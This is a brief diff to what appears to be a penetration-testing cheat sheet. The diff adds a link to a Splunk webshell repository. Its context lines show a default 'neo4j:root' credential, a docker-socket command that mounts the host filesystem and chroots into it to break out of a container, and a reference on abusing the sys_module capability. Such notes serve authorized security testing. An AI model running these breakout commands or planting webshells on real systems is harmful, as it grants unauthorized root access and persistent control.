@@ -495,3 +495,6 @@ neo4j:root
 docker -H unix:///tmp/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
 * sys_module capabilities
 https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd
+
+[splunk webshell]
+https://github.com/TBGSecurity/splunk_shells
